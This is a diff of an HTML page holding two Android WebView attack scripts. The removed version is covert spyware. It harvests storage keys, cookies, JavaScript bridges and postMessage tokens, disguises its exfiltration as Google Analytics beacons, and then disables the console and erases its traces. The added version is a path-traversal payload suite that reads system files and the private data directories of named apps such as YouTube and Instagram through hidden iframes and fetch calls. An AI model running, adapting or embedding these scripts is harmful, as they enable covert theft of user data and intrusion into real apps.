@@ -1,357 +1,300 @@
 <html>
-<head>
-<meta charset="UTF-8">
-<meta name="viewport" content="width=device-width, initial-scale=1.0">
-<style>
-/* Hidden elements, no visible indicators */
-body { background: white; color: white; font-size: 0; margin: 0; }
-.hidden, iframe, object, embed { position: absolute; width: 1px; height: 1px; opacity: 0.01; pointer-events: none; z-index: -999; }
-#status { display: none; }
-</style>
-</head>
 <body>
-
-<!-- Innocuous container that won't raise suspicion -->
-<div id="analytics" style="display:none"></div>
+<h3 style="display:none">Loading...</h3>
 <script>
-
 // ===========================================
-// STEALTH WEBVIEW RECONNAISSANCE
-// Uses benign-looking patterns, delays execution, no obvious console spam
+// ANDROID WEBVIEW PATH TRAVERSAL TEST SUITE
+// Tests for file:// URI sanitization bypasses
 // ===========================================
 
 (function() {
     'use strict';
     
-    // Store findings silently
-    const findings = {
-        ua: navigator.userAgent,
-        platform: navigator.platform,
-        vendor: navigator.vendor,
-        language: navigator.language,
-        timestamp: Date.now()
-    };
+    console.log('[*] Starting Path Traversal tests...');
     
-    // Helper - silent logging to DOM instead of console
-    const log = function(category, value) {
-        if (!findings[category]) findings[category] = [];
-        findings[category].push(value.substring ? value.substring(0, 150) : value);
+    // ============ TECHNIQUE 1: BASIC TRAVERSAL ============
+    const traversalPayloads = [
+        // Standard traversal
+        '../../../etc/hosts',
+        '../../../../etc/hosts',
+        '../../../../../etc/hosts',
         
-        // Store in DOM silently
-        const el = document.getElementById('analytics');
-        if (el) el.setAttribute('data-' + category, JSON.stringify(findings[category]).slice(0, 200));
-    };
-    
-    // Helper - no visible errors, silent failure
-    const safeExecute = (fn, fallback) => { try { return fn(); } catch(e) { return fallback || null; } };
-    
-    // ============ PHASE 1: ENVIRONMENT FINGERPRINTING (BENIGN-LOOKING) ============
-    
-    // Wait for "page view" timing - looks like normal tracking
-    window.addEventListener('DOMContentLoaded', function() {
-        setTimeout(function() {
-            // Detect WebView vs Browser (common tracking technique)
-            const isWebView = !!(window.navigator.userAgent.includes('wv') || 
-                                 (window.navigator.userAgent.includes('Version/') && 
-                                  window.navigator.userAgent.includes('Chrome/')) ||
-                                 window.navigator.userAgent.includes('; wv'));
-            
-            log('env', isWebView ? 'webview' : 'browser');
-            
-            // Detect known mobile apps via UA strings
-            const appSignatures = [
-                { name: 'YouTube', pattern: /com\.google\.android\.youtube|YouTube|YTLR|YTAndroid/ },
-                { name: 'Instagram', pattern: /Instagram|com\.instagram\.android/ },
-                { name: 'Facebook', pattern: /FBAV|com\.facebook\.catana/ },
-                { name: 'TikTok', pattern: /com\.zhiliaoapp\.musically|musically|TikTok/ },
-                { name: 'Twitter', pattern: /Twitter|com\.twitter\.android/ },
-                { name: 'Chrome', pattern: /Chrome/ },
-                { name: 'Samsung', pattern: /SamsungBrowser|SM-|GT-/ }
-            ];
-            
-            for (const app of appSignatures) {
-                if (app.pattern.test(navigator.userAgent)) {
-                    log('app_detected', app.name);
-                    break;
-                }
-            }
-            
-            // Phase 2 starts after environment detection
-            detectBridges();
-            
-        }, 100); // Small delay mimics analytics script
-    });
-    
-    // ============ PHASE 2: BRIDGE DETECTION (NO EXPLICIT NAMES) ============
-    
-    function detectBridges() {
-        // Look for ANY non-standard global objects (much stealthier than searching by name)
-        const nativeGlobals = new Set(['window', 'document', 'navigator', 'location', 'history', 
-                                      'screen', 'localStorage', 'sessionStorage', 'console', 
-                                      'fetch', 'XMLHttpRequest', 'WebSocket', 'Worker', 
-                                      'indexedDB', 'crypto', 'performance', 'atob', 'btoa',
-                                      'setTimeout', 'setInterval', 'requestAnimationFrame']);
+        // URL encoded
+        '%2e%2e%2fetc%2fhosts',
+        '%252e%252e%252fetc%252fhosts',
+        '..%2f..%2f..%2fetc%2fhosts',
         
-        // Add common DOM interface names
-        const domInterfaces = ['HTMLElement', 'Node', 'Element', 'Event', 'CustomEvent', 
-                              'MutationObserver', 'IntersectionObserver', 'ResizeObserver',
-                              'FormData', 'Headers', 'Request', 'Response', 'Blob', 'File',
-                              'FileReader', 'URL', 'URLSearchParams', 'Image', 'Audio', 
-                              'Option', 'Promise', 'Map', 'Set', 'WeakMap', 'WeakSet',
-                              'ArrayBuffer', 'Int8Array', 'Uint8Array', 'DataView',
-                              'JSON', 'Math', 'Date', 'RegExp', 'Error', 'EvalError',
-                              'RangeError', 'ReferenceError', 'SyntaxError', 'TypeError',
-                              'URIError', 'Function', 'Object', 'Array', 'String',
-                              'Number', 'Boolean', 'Symbol', 'Proxy', 'Reflect'];
+        // Unicode/UTF-8 variants
+        '．．／etc/hosts',  // Fullwidth dots
+        '..%c0%afetc%c0%afhosts',  // Overlong UTF-8
         
-        domInterfaces.forEach(i => nativeGlobals.add(i));
+        // Mixed encoding
+        '..%252f..%252f..%252fetc/passwd',
+        '..%255c..%255c..%255cwindows/win.ini',
         
-        // Get all global properties silently
-        let customObjects = [];
-        try {
-            for (let prop in window) {
-                if (!nativeGlobals.has(prop) && !prop.startsWith('_') && !prop.startsWith('$')) {
-                    try {
-                        const value = window[prop];
-                        if (value && typeof value === 'object' && 
-                            !Array.isArray(value) && 
-                            !(value instanceof HTMLElement) &&
-                            !(value instanceof Node)) {
-                            
-                            // Check if it has methods (likely a bridge)
-                            let hasMethods = false;
-                            for (let method in value) {
-                                if (typeof value[method] === 'function') {
-                                    hasMethods = true;
-                                    break;
+        // Android specific paths
+        '../../../../data/data/com.android.providers.settings/databases/settings.db',
+        '../../../../data/local/tmp/',
+        '../../../../storage/emulated/0/',
+        '../../../../sdcard/',
+        
+        // Null byte injection (old Android)
+        '../../../etc/hosts%00test',
+        '../../../../etc/hosts%00.jpg',
+        
+        // Parameter pollution
+        'file:///data/data/com.test.app/shared_prefs/test.xml?../../../../etc/hosts',
+        'file:///data/data/com.test.app/../../../../etc/hosts',
+        
+        // Symlink tricks
+        '../../../../proc/self/fd/0',
+        '../../../../proc/self/cmdline',
+        '../../../../proc/self/environ',
+        
+        // WebView specific
+        '/data/data/com.test.app/../../../../etc/hosts',
+        'file:///data/data/com.test.app/..%2f..%2f..%2f..%2fetc%2fhosts',
+        
+        // Fragment/combo attacks
+        '../../../etc/hosts#test',
+        '../../../etc/hosts?test=1'
+    ];
+
+    // ============ TECHNIQUE 2: IFRAME INJECTION ============
+    function testIframeTraversal() {
+        traversalPayloads.forEach((payload, index) => {
+            setTimeout(() => {
+                const iframe = document.createElement('iframe');
+                iframe.style.width = '1px';
+                iframe.style.height = '1px';
+                iframe.style.opacity = '0.01';
+                iframe.style.position = 'absolute';
+                
+                // Try different schemes
+                const urls = [
+                    `file://${payload}`,
+                    `file:///${payload}`,
+                    `content://media/${payload}`,
+                    `file://${payload.replace('etc', 'system/etc')}`
+                ];
+                
+                urls.forEach(url => {
+                    const testIframe = iframe.cloneNode();
+                    testIframe.src = url;
+                    
+                    testIframe.onload = function() {
+                        console.log(`[!] LOAD SUCCESS: ${url}`);
+                        try {
+                            if (testIframe.contentDocument) {
+                                const content = testIframe.contentDocument.body?.innerHTML || 
+                                              testIframe.contentDocument.documentElement?.innerHTML;
+                                console.log(`[!] CONTENT LENGTH: ${content?.length || 0}`);
+                                if (content?.includes('root') || content?.includes('localhost')) {
+                                    console.log(`[!] POTENTIAL HOSTS FILE: ${url}`);
                                 }
                             }
-                            
-                            if (hasMethods) {
-                                customObjects.push(prop);
-                                // Get just method names, no execution
-                                const methodNames = [];
-                                for (let m in value) {
-                                    if (typeof value[m] === 'function') methodNames.push(m);
-                                    if (methodNames.length > 5) break;
-                                }
-                                log('bridge', `${prop}:${methodNames.join(',')}`);
-                            }
+                        } catch(e) {
+                            // Cross-origin access blocked - but load succeeded!
+                            console.log(`[!] LOADED (CORS blocked): ${url}`);
                         }
-                    } catch(e) {}
-                }
-            }
-        } catch(e) {}
-        
-        // Phase 3: stealth local storage check
-        setTimeout(checkStorage, 200);
+                    };
+                    
+                    testIframe.onerror = function() {
+                        // Silent fail - most will hit here
+                    };
+                    
+                    document.body.appendChild(testIframe);
+                    setTimeout(() => {
+                        try { document.body.removeChild(testIframe); } catch(e) {}
+                    }, 500);
+                });
+            }, index * 50);
+        });
     }
-    
-    // ============ PHASE 3: STORAGE ACCESS (LOOKS LIKE ANALYTICS) ============
-    
-    function checkStorage() {
-        // Looks like analytics fingerprinting
-        try {
-            // Check if we can write (most apps allow this)
-            const testKey = '_lsc' + Math.floor(Math.random() * 1000);
-            localStorage.setItem(testKey, '1');
-            localStorage.removeItem(testKey);
-            log('storage', 'localStorage_accessible');
-            
-            // Get keys without obvious enumeration pattern
-            if (localStorage.length > 0) {
-                const keys = [];
-                for (let i = 0; i < Math.min(localStorage.length, 3); i++) {
-                    try {
-                        const key = localStorage.key(i);
-                        if (key && !key.startsWith('_ga') && !key.includes('analytics')) {
-                            const val = localStorage.getItem(key);
-                            keys.push(key + ':' + (val ? val.substring(0, 20) : ''));
-                        }
-                    } catch(e) {}
-                }
-                if (keys.length) log('local_keys', keys.join('|'));
-            }
-        } catch(e) {}
-        
-        // Check sessionStorage (often contains session tokens)
-        try {
-            if (sessionStorage.length > 0) {
-                const keys = [];
-                for (let i = 0; i < Math.min(sessionStorage.length, 3); i++) {
-                    try {
-                        const key = sessionStorage.key(i);
-                        if (key) keys.push(key);
-                    } catch(e) {}
-                }
-                if (keys.length) log('session_keys', keys.join('|'));
-            }
-        } catch(e) {}
-        
-        // Phase 4: cookie inspection (looks like GDPR/CCPA check)
-        setTimeout(checkCookies, 150);
-    }
-    
-    // ============ PHASE 4: COOKIE SNIFFING (GDPR COMPLIANCE CHECK) ============
-    
-    function checkCookies() {
-        if (document.cookie && document.cookie.length > 0) {
-            const cookies = document.cookie.split(';').slice(0, 3);
-            const summary = cookies.map(c => {
-                const parts = c.trim().split('=');
-                return parts[0] + '=' + (parts[1] ? '***' : '');
-            }).join('; ');
-            log('cookies', summary);
-        }
-        
-        // Phase 5: Content provider test (very subtle)
-        setTimeout(checkContentProviders, 250);
-    }
-    
-    // ============ PHASE 5: CONTENT PROVIDERS (1x1 PIXEL TECHNIQUE) ============
-    
-    function checkContentProviders() {
-        // Use img tags for stealth - looks like tracking pixels
-        const providers = [
-            'content://com.google.android.youtube.fileprovider/shared_prefs/',
-            'content://com.google.android.apps.plus.fileprovider/',
-            'content://com.facebook.app.fileprovider/',
-            'content://com.instagram.android.fileprovider/',
-            'content://com.sec.android.gallery3d.provider/'
+
+    // ============ TECHNIQUE 3: OBJECT/EMBED TAGS ============
+    function testObjectTraversal() {
+        const criticalFiles = [
+            '../../../etc/hosts',
+            '../../../etc/passwd', 
+            '../../../../proc/version',
+            '../../../../proc/self/cmdline',
+            '../../../data/local/tmp/',
+            '../../../../storage/emulated/0/Download/'
         ];
         
-        providers.forEach((uri, idx) => {
-            // Delay each request
+        criticalFiles.forEach((file, index) => {
             setTimeout(() => {
-                // Image approach - silent, no error logs
-                const img = new Image();
-                img.style.display = 'none';
-                img.onload = function() { log('provider', uri + ':accessible'); };
-                img.onerror = function() { /* silent fail */ };
-                img.src = uri;
+                const obj = document.createElement('object');
+                obj.type = 'text/plain';
+                obj.data = `file://${file}`;
+                obj.style.display = 'none';
                 
-                // Also attempt fetch with no-cors (even more silent)
-                try {
-                    fetch(uri, { mode: 'no-cors', cache: 'no-store', credentials: 'omit' })
-                        .then(() => log('provider_fetch', uri))
-                        .catch(() => {});
-                } catch(e) {}
-            }, idx * 100);
+                obj.onload = () => console.log(`[!] OBJECT LOADED: ${file}`);
+                
+                document.body.appendChild(obj);
+                setTimeout(() => {
+                    try { document.body.removeChild(obj); } catch(e) {}
+                }, 300);
+            }, index * 100);
+        });
+    }
+
+    // ============ TECHNIQUE 4: FETCH/XHR ATTEMPTS ============
+    function testFetchTraversal() {
+        const xhrTests = [
+            '../../../etc/hosts',
+            '../../../../data/data/com.android.providers.settings/databases/settings.db'
+        ];
+        
+        xhrTests.forEach(path => {
+            const url = `file://${path}`;
+            
+            // Try XHR
+            try {
+                const xhr = new XMLHttpRequest();
+                xhr.open('GET', url, true);
+                xhr.onreadystatechange = function() {
+                    if (xhr.readyState === 4) {
+                        if (xhr.status === 200) {
+                            console.log(`[!] XHR SUCCESS: ${url}`);
+                            console.log(`[!] RESPONSE: ${xhr.responseText?.substring(0, 100)}`);
+                        }
+                    }
+                };
+                xhr.send();
+            } catch(e) {}
+            
+            // Try fetch with no-cors
+            try {
+                fetch(url, { mode: 'no-cors', cache: 'no-store' })
+                    .then(r => console.log(`[!] FETCH SUCCESS: ${url}`))
+                    .catch(() => {});
+            } catch(e) {}
+        });
+    }
+
+    // ============ TECHNIQUE 5: WEBVIEW SPECIFIC BYPASSES ============
+    function testWebViewBypasses() {
+        // Bypass 1: Scheme confusion
+        const schemeBypasses = [
+            'file:///android_asset/../../../../etc/hosts',
+            'file:///android_res/../../../../etc/hosts',
+            'content://com.android.fileprovider/../shared_prefs/',
+            'file:///storage/emulated/0/../../etc/hosts'
+        ];
+        
+        schemeBypasses.forEach((bypass, i) => {
+            const img = new Image();
+            img.src = bypass;
+            img.onload = () => console.log(`[!] SCHEME BYPASS: ${bypass}`);
+            img.style.display = 'none';
+            document.body.appendChild(img);
+            setTimeout(() => img.remove(), 100);
         });
         
-        // Phase 6: PostMessage listener (covert comms)
-        setupMessageListener();
+        // Bypass 2: Double encoding
+        const doubleEncode = '%252e%252e%252f%252e%252e%252f%252e%252e%252fetc%252fhosts';
+        const link = document.createElement('link');
+        link.rel = 'prefetch';
+        link.href = `file://${doubleEncode}`;
+        document.head.appendChild(link);
+        setTimeout(() => link.remove(), 100);
     }
-    
-    // ============ PHASE 6: COVERT COMMUNICATIONS ============
-    
-    function setupMessageListener() {
-        window.addEventListener('message', function(e) {
-            // Only log specific patterns to avoid noise
-            if (e.data && typeof e.data === 'string' && 
-                (e.data.includes('token') || e.data.includes('auth') || e.data.includes('key'))) {
-                log('postmessage', e.origin + ':' + e.data.substring(0, 30));
-            }
-        }, false);
+
+    // ============ TECHNIQUE 6: ERROR-BASED INFERENCE ============
+    function testErrorInference() {
+        // Detect if file:// is even allowed
+        const testPaths = [
+            'file:///data/data/com.test.app/shared_prefs/test.xml',  // Should 404
+            'file:///data/data/com.test.app/',  // Should 403 or 404
+            'file:///system/etc/hosts'  // Might exist
+        ];
         
-        // Phase 7: protocol handler enumeration (looks like deep linking)
-        setTimeout(checkProtocols, 500);
+        testPaths.forEach((path, i) => {
+            setTimeout(() => {
+                const start = Date.now();
+                fetch(path, { mode: 'no-cors' })
+                    .finally(() => {
+                        const time = Date.now() - start;
+                        // If request takes >100ms, might be trying to access
+                        if (time > 100) {
+                            console.log(`[*] Timing inference: ${path} took ${time}ms`);
+                        }
+                    })
+                    .catch(() => {});
+            }, i * 50);
+        });
     }
-    
-    // ============ PHASE 7: DEEP LINK TESTING (LOOKS LIKE USER INTERACTION) ============
-    
-    function checkProtocols() {
-        // Create invisible iframe for intent testing (stealthier than location.href)
-        const iframe = document.createElement('iframe');
-        iframe.style.display = 'none';
-        iframe.src = 'intent://#Intent;scheme=https;end'; // Minimal intent
-        document.body.appendChild(iframe);
-        setTimeout(() => { try { document.body.removeChild(iframe); } catch(e) {} }, 50);
-        
-        // Test for WebView debugging flags
-        if (window.console && typeof console.debug === 'function') {
-            // Chrome DevTools protocol detection
-            if (window.chrome && window.chrome.runtime && window.chrome.runtime.id) {
-                log('debug', 'devtools_present');
-            }
-        }
-        
-        // Final phase: exfil if findings are interesting (stealthy)
-        setTimeout(exfiltrateIfInteresting, 1000);
-    }
-    
-    // ============ PHASE 8: SELECTIVE EXFILTRATION ============
-    
-    function exfiltrateIfInteresting() {
-        // Only exfil if we found something valuable (reduces noise)
-        const hasBridges = findings.bridge && findings.bridge.length > 0;
-        const hasProviderAccess = findings.provider && findings.provider.length > 0;
-        const hasTokens = findings.cookies || findings.local_keys;
-        
-        if (hasBridges || hasProviderAccess || hasTokens) {
-            // Method 1: Beacon API (most stealthy, doesn't block page)
-            if (navigator.sendBeacon) {
-                const data = JSON.stringify({
-                    t: 'stats',
-                    d: findings,
-                    u: window.location.href,
-                    r: document.referrer
-                });
-                
-                // Encode in small chunks to avoid detection
-                const chunk1 = btoa(encodeURIComponent(data.substring(0, 100)));
-                const chunk2 = btoa(encodeURIComponent(data.substring(100)));
-                
-                // Send to benign-looking endpoint
-                navigator.sendBeacon('https://www.google-analytics.com/collect', 'v=1&tid=UA-XXXXX&cid=555&t=pageview&dp=/api/collect?d=' + chunk1);
-                setTimeout(() => {
-                    if (chunk2.length > 10) {
-                        navigator.sendBeacon('https://www.google-analytics.com/collect', 'v=1&tid=UA-XXXXX&cid=555&t=pageview&dp=/api/cont?d=' + chunk2);
-                    }
-                }, 50);
-            } 
-            // Method 2: Image ping
-            else {
-                const img = new Image();
-                img.src = 'https://www.google-analytics.com/collect?v=1&t=event&ec=app&ea=stats&el=' + 
-                          encodeURIComponent(btoa(JSON.stringify(findings).substring(0, 500)));
-            }
-        }
-        
-        // Store findings locally for later retrieval
-        try {
-            sessionStorage.setItem('_ab_test_' + Math.floor(Date.now() / 1000), 
-                                  btoa(JSON.stringify(findings)).substring(0, 1000));
-        } catch(e) {}
-    }
-    
-    // Self-destruct after 30 seconds - removes all traces
-    setTimeout(function() {
-        try {
-            // Clear any stored data
-            document.getElementById('analytics')?.remove();
+
+    // ============ TECHNIQUE 7: APP-SPECIFIC PATHS ============
+    function testAppSpecificPaths() {
+        // Try to identify the current app via error patterns
+        const appPaths = [
+            // YouTube
+            '/data/data/com.google.android.youtube/shared_prefs/youtube.xml',
+            '/data/data/com.google.android.youtube/databases/youtube.db',
+            '/data/data/com.google.android.youtube/cache/',
             
-            // Overwrite findings
-            for (let key in findings) delete findings[key];
+            // Instagram
+            '/data/data/com.instagram.android/shared_prefs/',
+            '/data/data/com.instagram.android/databases/',
             
-            // No console logs ever
-            console.log = console.debug = console.info = console.warn = console.error = function() {};
-        } catch(e) {}
-    }, 30000);
-    
+            // Facebook
+            '/data/data/com.facebook.katana/shared_prefs/',
+            '/data/data/com.facebook.orca/',
+            
+            // TikTok
+            '/data/data/com.zhiliaoapp.musically/shared_prefs/',
+            
+            // Twitter
+            '/data/data/com.twitter.android/shared_prefs/',
+            
+            // General
+            '/data/data/%package%/shared_prefs/%package%_preferences.xml'
+        ];
+        
+        appPaths.forEach((path, i) => {
+            setTimeout(() => {
+                const traversal = `../../../../..${path}`;
+                const iframe = document.createElement('iframe');
+                iframe.src = `file://${traversal}`;
+                iframe.style.display = 'none';
+                
+                iframe.onload = () => {
+                    console.log(`[!] APP PATH ACCESSIBLE: ${path}`);
+                    // Try to read content
+                    setTimeout(() => {
+                        try {
+                            const content = iframe.contentDocument?.body?.innerText;
+                            if (content) console.log(`[!] CONTENT: ${content.substring(0, 200)}`);
+                        } catch(e) {}
+                    }, 100);
+                };
+                
+                document.body.appendChild(iframe);
+                setTimeout(() => iframe.remove(), 200);
+            }, i * 100);
+        });
+    }
+
+    // ============ EXECUTION ============
+    console.log('[*] Starting Path Traversal tests in 2 seconds...');
+    setTimeout(() => {
+        testIframeTraversal();
+        testObjectTraversal();
+        testFetchTraversal();
+        testWebViewBypasses();
+        testErrorInference();
+        testAppSpecificPaths();
+        
+        console.log('[*] All tests initiated - check console for successes');
+    }, 2000);
+
 })();
-
-// ============ STEALTH MODE: NO CONSOLE OUTPUT EVER ============
-// Override console immediately
-if (window.console) {
-    window.console.log = window.console.debug = window.console.info = 
-    window.console.warn = window.console.error = function() {};
-}
-
-// ============ INNOCUOUS VISUAL ELEMENT ============
-// Render something that looks like a normal web component
-document.write('<div style="height:0;width:0;overflow:hidden;position:absolute">Loading analytics...</div>');
-
 </script>
+
+<!-- Hidden reporting div -->
+<div id="results" style="display:none"></div>
 </body>
 </html>
